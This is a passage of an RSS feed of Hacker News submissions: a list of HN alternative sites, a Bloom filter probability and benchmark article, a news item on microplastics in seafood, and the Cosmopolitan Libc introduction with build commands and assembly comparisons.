<p><a href="https://old.reddit.com/r/hackernews/">/r/hackernews</a><br>
Subreddit for HN<br>
51,450 readers</p>
<p><a href="https://hnreplies.com/">hnreplies.com</a><br>
Emails on replies to your comments<br>
Alexa: 3.2m</p>
<p><a href="https://apps.apple.com/us/app/id1308885491">Octal iOS App</a><br>
Full-featured HN client with support for posting/voting/comments – iOS only.<br>
4.8/5.0 – 1K Ratings</p>
<p><a href="https://hnrss.github.io/">hnrss.github.io</a><br>
HN RSS Feed<br>
Alexa: None</p>
<p><a href="https://hackerne.ws/">hackerne.ws</a><br>
HN Short Link – redirects to https://news.ycombinator.com<br>
Alexa: None</p>
<p><a href="https://chrome.google.com/webstore/detail/hacker-news-ux/chngbdmhgakoomomnnhfapkpbalpmhid">Hacker News UX</a><br>
Chrome Extension for Improved UI<br>
356 users</p>
<p><a href="https://f5bot.com/">f5bot.com</a><br>
Reddit / HN / Lobsters keyword mention watch tool.<br>
Alexa: 1.1m</p>

<h2>Graveyard</h2>
<p>hackermonthly.com [<a href="https://web.archive.org/web/20160731192600/http://hackermonthly.com/">defunct</a>]<br>
HN in print</p>
<p>quiethn.com [<a href="https://web.archive.org/web/20171001013212/https://quiethn.com/">defunct</a>]<br>
HN with less clutter </p>
<p>hackerblogs.com [<a href="https://web.archive.org/web/20110204021331/http://www.hackerblogs.com/">defunct</a>]<br>
2011-era mobile view</p>
<p>hackernews.im [defunct]<br>
now <a href="https://hackernews.betacat.io/">hackernews.betacat.io</a></p>
<p>tiledhn.com [<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">defunct</a>]<br>
Windows 8-type view for HN</p>
<p>hackerbra.in [<a href="https://web.archive.org/web/20181105131330/http://hackerbra.in/">defunct</a>]<br>
HN with inline top comments </p>
<p>hnwatcher.com [<a href="https://web.archive.org/web/20201125052525/https://www.hnwatcher.com/">defunct</a>]<br>
user/keyword email notification service</p>
<p>hnmobile.herokuapp.com [<a href="https://web.archive.org/web/20180601000346/http://hnmobile.herokuapp.com/">defunct</a>]<br>
HN mobile friendly mirror</p>
<p>hackernewsemail.com [<a href="https://web.archive.org/web/20180826215821/https://hackernewsemail.com/">defunct</a>]<br>
Daily email for posts with minimum set number of points</p>
<p>hacker-newspaper.gilesb.com [<a href="https://web.archive.org/web/20180402131152/https://news.ycombinator.com/">defunct</a>]<br>
HN Mirror</p>
<p>react-hn.appspot.com [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror</p>
<p>hackeroo.co [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror </p>
</div></div>]]>
            </description>
            <link>https://blog.luke.lol/tech/hacker-news-alternatives/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556990</guid>
            <pubDate>Mon, 28 Dec 2020 05:37:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bloom Filter – Probability and Benchmarks]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25556713">thread link</a>) | @todsacerdoti
<br/>
December 27, 2020 | http://andybui01.github.io/bloom-filter/ | <a href="https://web.archive.org/web/*/http://andybui01.github.io/bloom-filter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Bloom filters are a data structure which allows you to test whether an element exists in a set, with lower memory usage and better access times than other hash table implementations. It is probabilistic, and while it can guarantee negative matches, there is a slight chance it returns a false positive match. Through clever mathematical assumptions, we can produce constraints to minimise the chance of a false positive.</p>





<p><strong>Contents</strong></p>
<ol>
  <li><a href="#description">Description</a></li>
  <li><a href="#proof">Proof</a></li>
  <li><a href="#implementation-and-benchmarks">Implementation and benchmarks</a></li>
</ol>



<h2 id="description">Description</h2>

<p>Let there be a set of elements $N$, and we wish to store each element $e \in N$ in the set $F$. To do this, we introduce the set $K$ which has $k$ number of hash functions which hash the same element to <em>different</em> values.</p>

<p>In the following example, elements $x$ and $y$ are hashed by $k = 3$ hash functions.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure1.png" width="200"></p>

<p>Next, we introduce the bit array $M$ which has $m$ bits. This bit array is the underlying data structure that represents $F$, and we say an element $e$ is in $F$ if all of its corresponding bits (after hashing) in the bit array are set.</p>

<p>In the following image, $x$ is in $F$ hence all of its hashed bits within $M$ are set. Only one of $y$â€™s hashed bits are set so it is not in $F$. $x$ and $y$ are also sharing a bit at $M[4]$.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure2.png" width="400"></p>

<p>As we hash more elements from $N$, more bits are set to 1 in $M$ and eventually we get a <em>false positive</em> when testing set membership. This occurs when all of an elementâ€™s bits are set, although it was never inserted.</p>

<p>Consider the following scenario: $x$ and $y$ are in $F$, $z$ is not. However, $z$â€™s hashed bits are all set, giving the (false) impression that $z$ is in $F$.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure3.png" width="500"></p>

<p>Once an element is placed in $F$, it will remain there, as flipping bits to remove an element introduces the possibility of false negatives. We will show that there exists optimal parameters, $k$ hash functions and $m$ length bit array, to lower the false positive rate $\epsilon$.</p>



<h2 id="proof">Proof</h2>
<p>Note: This section is pretty math heavy, if you just want to look at the cool tables and graphs then you can skip ahead to <a href="#implementation-and-benchmarks">here</a>.</p>

<p>$\newcommand{\pbrac}[1]{\left(#1\right)}$
$\newcommand{\sbrac}[1]{\left[#1\right]}$</p>

<h3 id="first-attempt">First attempt</h3>
<p>Assume that a hash function in $K$ maps to each array position with <em>equal probability</em>. The probability that a bit is not set by a hash function during the insertion of an element is:</p>

<p>\begin{align}
    1 - \frac{1}{m}.
\end{align}</p>

<p>The probability that every hash function in $K$ leaves a certain bit at 0 will be</p>

<p>\begin{align}
    \left( 1 - \frac{1}{m} \right)^k \approx \ e^{-k/m}.
\end{align}</p>

<p>Thus, after inserting $n$ elements, the probability that a bit is <em>still</em> 0 is</p>

<p>\begin{align}
    \left( 1 - \frac{1}{m} \right)^{kn} \approx \ e^{-kn/m} \ = \ p,
\end{align}</p>

<p>and the probability that a bit is 1 after $n$ insertions is</p>

<p>\begin{align}
    \left( 1 - \left[ 1 - \frac{1}{m} \right]^{kn} \right) \approx \left( 1 - p \right).
\end{align}</p>

<p>Next, we test set membership for an element NOT in the set. Following $n$ insertions, each bit in the array has a chance of being set to 1 with the probability above. The probability that $k$ bits are set to 1, which would lead to a false positive result for set membership, is often referred to as the error/false positive rate:</p>

<p>\begin{align}
    \epsilon = \left( 1 - \left[ 1 - \frac{1}{m} \right]^{kn} \right)^k \approx \left( 1 - p \right)^k.
\end{align}</p>

<p>There exists a major problem with this analysis, however. At the start we made an assumption that all bits would be set randomly and independently. <strong>This is not correct</strong> as we have established that <em>all</em> our hash functions in $K$ will not hash an element to the same array position. For example, if we have hashed an element $m-1$ times into $m-1$ different positions, then the remaining $1$ bit in the array is guaranteed to be chosen, if we wish to retain an even spread of hashed values. Concretely, the $k$ bit array positions for each element are in fact <em>dependent</em>.</p>

<h3 id="another-try-using-poisson-approximations">Another try using Poisson approximations</h3>

<p>Consider a â€œballs and binsâ€� scenario where each throw of a ball into a bin is equivalent to hashing an element to an array position.</p>

<p>We have the following 2 cases:</p>
<ul>
  <li><strong>Exact case:</strong> $n$ balls are thrown into $m$ bins independently and uniformly at random</li>
  <li><strong>Poisson case:</strong> number of balls in each bin are taken to be independent Poisson random variables with an expected value</li>
</ul>

<p>Weâ€™ll be using the following corollaries from the book <em>â€œProbability and computing: randomization and probabilistic techniques in algorithms and data analysisâ€�</em> by Mitzenmacher and Upfal.</p>

<p><strong>Corollary 4.6:</strong> Let $X_1,â€¦,X_n$ be independent Poisson trials such that $P(X_i = 1) = p_i$. Let $X = \sum_{i=1}^{n} \text{ and } \mu = E(X)$. For $0 &lt; \delta &lt; 1$. [p. 71]
\begin{align}
    P\left(\left|X - \mu\right| \geq \delta \mu\right) \leq 2\exp{\left(-\frac{\mu\delta^2}{3}\right)}
\end{align}</p>

<p><strong>Corollary 5.9:</strong> any event that takes place with probability $p$ in the Poisson case takes place with probability at most $p e \sqrt{n}$ in the exact case. [p. 109]</p>

<p>Each bin corresponds to an array position and thus a bit being set to 0 is equivalent to an empty bin in our scenario. The fraction of bits being set to 0 after $n$ insertions is therefore equivalent to the fraction of empty bins after $kn$ balls have been thrown into $m$ bins.</p>

<p>We define $X$ as the number of empty bins after the balls have been thrown into $n$ bins, such that</p><p>

\[\begin{align}
    X =&amp; \ \sum_{i=1}^{n} X_i, \\
    \text{where } X_i =&amp; \
    \begin{cases}
        1 &amp; \text{if bin is empty} \\
        0 &amp; \text{otherwise}
    \end{cases}
\end{align}\]

</p><p>then we can define</p><p>

\[\begin{align}
    p' =&amp; \ \left( 1 - \frac{1}{m}\right)^{kn}, \\
    E(X) =&amp; \ mp'.
\end{align}\]

</p><p>In the Poisson case, each bin can be thought of as an independent Poisson random variable with expected value $pâ€™$. Therefore, we can apply \textbf{corollary 4.6} and $E(X) = \ mpâ€™$ to obtain the following:</p>

<p>\begin{align}
    P\left( \left| X - mpâ€™\right| \geq \delta mpâ€™\right) \ \leq&amp; \ 2\exp{\left(-\frac{mpâ€™\delta^2}{3}\right)}
\end{align}
Let $\delta \ = \ \beta / pâ€™, \ $choose small$ \ \beta$
\begin{align}
    \therefore \ P\left( \left| X - mpâ€™\right| \geq \beta m\right) \ \leq&amp; \ 2\exp{\left(-\frac{m\beta^2}{3pâ€™}\right)}
\end{align}</p>

<p>We then apply <strong>corollary 5.9</strong> to obtain</p><p>

\[\begin{align}
    P\left( \left| X - mp'\right| \geq \beta m\right) \ \leq&amp; \ 2e\sqrt{kn} \exp{\left(-\frac{m\beta^2}{3p'}\right)}\\
    \leq&amp; \ 0.000001 \ \text{when $m$ sufficiently large.}
\end{align}\]

</p><p>Essentially, taking the probability of an event using a Poisson approximation for all of the bins and multiplying it by $e\sqrt{kn}$ gives an upper bound for the probability of the event when $kn$ balls are thrown into $m$ bins (the exact case where events are independent).</p>

<p>This result tells us that when $m$ is sufficiently large, the fraction of empty bins $X/m$ is <em>very</em> close to $pâ€™$. And since $pâ€™ \approx p$ we can use $p$ to continue predicting actual performance.</p>

<h3 id="optimal-k">Optimal <em>k</em></h3>

<p>The false positive rate is $\epsilon = (1-p)^k$ and we look for a $k$ that minimizes $\epsilon$. Rearranging $\epsilon$ gives us</p><p>

\[\begin{align}
    \epsilon \ =&amp; \ \pbrac{1-p}^k \\
    =&amp; \ \exp{\pbrac{\ln{\pbrac{\sbrac{1-p}^k}}}} \\
    =&amp; \ \exp{\pbrac{k\ln{\pbrac{\sbrac{1-p}}}}} \\
    =&amp; \ \exp{\pbrac{k\ln{\pbrac{\sbrac{1-e^{-kn/m}}}}}}.
\end{align}\]

</p><p>If we let $g = k\ln{\pbrac{1-e^{-kn/m}}}$ so that $\epsilon = e^g$, then minimizing the false positive $\epsilon$ is equivalent to minimizing $g$ with respect to $k$. We have</p>

<p>\begin{align}
    \frac{dg}{dk}\ =&amp; \ \ln \left(1-e^{-\frac{nk}{m}}\right)+\frac{kn \cdot e^{-\frac{nk}{m}}}{m\left(1-e^{-\frac{nk}{m}}\right)}.
\end{align}</p>

<p>Solving this derivative when it is 0 and finding the global minimum gives us</p>

<p>\begin{align}
    k = \frac{m}{n}\ln\pbrac{2}.
\end{align}</p>

<h3 id="optimal-m">Optimal <em>m</em></h3>
<p>To find an optimal length for our bit-array we substitute $k = \frac{m}{n}\ln\pbrac{2}$ into our false positive equation and get</p><p>

\[\begin{align}
    \epsilon \ =&amp; \ \pbrac{1-e^{-\ln 2}}^{\frac{m}{n}\ln 2} \\
    \ln\epsilon \ =&amp; \ \frac{m}{n}\ln\pbrac{2}\ln\pbrac{1-e^{-\ln 2}} \\
    =&amp; \ \frac{m}{n}\ln\pbrac{2}\ln{\frac{1}{2}} \\
    =&amp; \ -\frac{m}{n}\ln\pbrac{2}^2 \\
    \therefore m \ =&amp; \ \frac{-n\ln\epsilon}{\ln\pbrac{2}^2}.
\end{align}\]

</p><p>This effectively leaves $\epsilon$ as the only unknown variable left. However, when we consider the Bloom filter in a practical context, we will most likely have a false positive rate in mind, and can treat it as a constant.</p>



<h2 id="implementation-and-benchmarks">Implementation and benchmarks</h2>

<h3 id="overview">Overview</h3>
<p>We will be comparing the Bloom filter against 4 popular and efficient implementations of hash tables:</p>

<ul>
  <li>Google Dense Hash Set</li>
  <li>Google Sparse Hash Set</li>
  <li>TSL Robin Set</li>
  <li>STD Unordered Set</li>
</ul>

<p>Implementations were compared based on time performance (insert, read) and memory performance (inserts). Currently, only small strings (15 characters) and medium strings (50 characters) are used for input, with up to $n = 3\times10^6$ elements for each test. Each test was performed 5 times for each implementation and an average-of-5 was used in the final table/graph. The false positive rate is set to 0.01.</p>

<p>Benchmarking was done using gccâ€™s C++ compiler and the following command was run to compile: g++ -Iinclude -std=c++11 -O3. In addition, the tests were performed on a computer with the following specs:</p>

<ul>
  <li>AMD Ryzen 5 2600 3.4GHz 6 core</li>
  <li>8GB DDR4-2666 CL19</li>
</ul>

<p>The tests were run with the false positive rate $\epsilon = 0.01$</p>



<h3 id="insert-small-string-15-bytes">Insert small string (15 bytes)</h3>

<p>Before the test, we generate a vector of $n$ small strings and then insert each string as an entry into the sets, measuring the performance of said insert operation. The Bloom filterâ€™s only overhead during insertion is setting bits to 1.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/insert_small_string.png" width="700"></p>



<h3 id="read-small-string-15-bytes">Read small string (15 bytes)</h3>

<p>Before the test, we generate a vector of $n$ small strings and pre-load the strings into the hash tables. We then traverse the same vector of small strings, testing set membership and timing said read operation.</p>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://andybui01.github.io/bloom-filter/">http://andybui01.github.io/bloom-filter/</a></em></p>]]>
            </description>
            <link>http://andybui01.github.io/bloom-filter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556713</guid>
            <pubDate>Mon, 28 Dec 2020 04:35:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study Demonstrates Seafood Contains the Heaviest Amount of Microplastics]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25556589">thread link</a>) | @voldemort1968
<br/>
December 27, 2020 | https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/ | <a href="https://web.archive.org/web/*/https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>In a review <a href="https://ehp.niehs.nih.gov/doi/full/10.1289/EHP7171">published in Environmental Health Perspectives</a>, Microplastics (MPs) are laid out as a serious problem in the marine environment as well as human food consumption.</p><p>The study analyzed 69 experiments across mollusks, crustaceans, fish and echinodermata. The data show that seafood is a major cause of human exposure to MPs. Levels of MP contamination vary significantly in different phylum of organisms. </p><p>Microplastics are tiny pieces of any kind of plastic found in the environment less than 5mm long according to NOAA and the European Chemicals Agency. They often end up in nature from cosmetics, clothing, and industrial processes.</p><figure><img src="https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Plastic (PET) bottles collected from the river Tisza. They are ready to be transported and recycled." srcset="https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@mihaly_koles?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Mihály Köles</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Two classifications of microplastics exist. Primary microplastics are smaller than 5mm. Polyester, nylon, and rayon fibers are also present (also known as nurdles). Secondary microplastics come from the micro degradation of larger plastic particles after their entrance into the environment through natural weathering processes.</p><p>"No-one yet fully understands the full impact of microplastics on the human body, but early evidence from other studies suggest they do cause harm." said study author, Evangelos Danopoulos, a postgraduate student at Hull York Medical School in an <a href="https://www.sciencedaily.com/releases/2020/12/201223091547.htm">article from Science Daily</a>.</p><p>"A critical step in understanding the full impact on human consumption is in first fully establishing what levels of microplastics humans are ingesting. We can start to do this by looking at how much seafood and fish is eaten and measuring the amount of MPs in these creatures."</p><figure><img src="https://smosa.com/content/images/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png" alt="" srcset="https://smosa.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 600w, https://smosa.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1000w, https://smosa.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1600w, https://smosa.com/content/images/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1962w" sizes="(min-width: 720px) 720px"><figcaption>Source: <a href="https://pubs.acs.org/doi/abs/10.1021/acs.est.9b01517">American Chemical Society; Expert(s) (Cox et al)</a></figcaption></figure><p>The study concludes that there needs to be harmonization and standardization of methods and procedures.</p><!--kg-card-begin: html--><p><a href="https://twitter.com/smosadotcom?ref_src=twsrc%5Etfw" data-show-count="false">Follow @smosadotcom</a></p><!--kg-card-end: html-->
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article></div>]]>
            </description>
            <link>https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556589</guid>
            <pubDate>Mon, 28 Dec 2020 04:07:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cosmopolitan Libc: build-once run-anywhere C library]]>
            </title>
            <description>
<![CDATA[
Score 560 | Comments 158 (<a href="https://news.ycombinator.com/item?id=25556286">thread link</a>) | @pantalaimon
<br/>
December 27, 2020 | https://justine.lol/cosmopolitan/index.html | <a href="https://web.archive.org/web/*/https://justine.lol/cosmopolitan/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
  <img width="196" height="105" src="https://storage.googleapis.com/justine/cosmopolitan/cosmopolitan.png" title="cosmopolitan honeybadger" alt="honeybadger">
  
  <span>build-once run-anywhere c without devops</span>
</header>

<nav>
  <ul>
    <li><a href="https://justine.lol/cosmopolitan/index.html">Intro</a>
    </li><li><a href="https://justine.lol/cosmopolitan/download.html">Download</a>
    </li><li><a href="https://justine.lol/cosmopolitan/documentation.html">Documentation</a>
    </li><li><a href="https://justine.lol/cosmopolitan/sources.html">Sources</a>
    </li><li><a href="https://github.com/jart/cosmopolitan">GitHub</a>
    </li><li><a href="https://justine.lol/cosmopolitan/license.html">License</a>
    </li><li><a href="https://justine.lol/index.html">» jart's web page</a>
  </li></ul>
</nav>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>
<span>strlcpy</span>:
	<span>push</span>	<span>%rbp</span>
	<span>mov</span>	<span>%rsp</span>,<span>%rbp</span>
	<span>push</span>	<span>%r14</span>
	<span>mov</span>	<span>%rsi</span>,<span>%r14</span>
	<span>push</span>	<span>%r13</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r13</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>push</span>	<span>%r12</span>
	<span>push</span>	<span>%rbx</span>
	<span>mov</span>	<span>%rdx</span>,<span>%rbx</span>
	<span>call</span>	strlen
	<span>mov</span>	<span>%rax</span>,<span>%r12</span>
	<span>test</span>	<span>%rbx</span>,<span>%rbx</span>
	<span>jne</span>	1f
	<span>pop</span>	<span>%rbx</span>
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
1:	<span>cmp</span>	<span>%rbx</span>,<span>%rax</span>
	<span>mov</span>	<span>%r14</span>,<span>%rsi</span>
	<span>mov</span>	<span>%r13</span>,<span>%rdi</span>
	<span>cmovbe</span>	<span>%rax</span>,<span>%rbx</span>
	<span>mov</span>	<span>%rbx</span>,<span>%rdx</span>
	<span>call</span>	memcpy
	<span>movb</span>	$<span>0</span>,0(<span>%r13</span>,<span>%rbx</span>)
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%rbx</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td><td>
<pre><span>/ compiled with cosmopolitan libc</span>
<span>strlcpy</span>:
	<span>mov</span>	<span>%rdx</span>,<span>%r8</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r9</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>call</span>	strlen
	<span>test</span>	<span>%r8</span>,<span>%r8</span>
	<span>je</span>	1f
	<span>cmp</span>	<span>%r8</span>,<span>%rax</span>
	<span>lea</span>	<span>-1(%r8)</span>,<span>%rdx</span>
	<span>mov</span>	<span>%r9</span>,<span>%rdi</span>
	<span>cmova</span>	<span>%rax</span>,<span>%rdx</span>
	<span>call</span>	MemCpy
	<span>movb</span>	$<span>0</span>,(<span>%r9</span>,<span>%rdx</span>)
1:	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

</p>
</div>]]>
            </description>
            <link>https://justine.lol/cosmopolitan/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556286</guid>
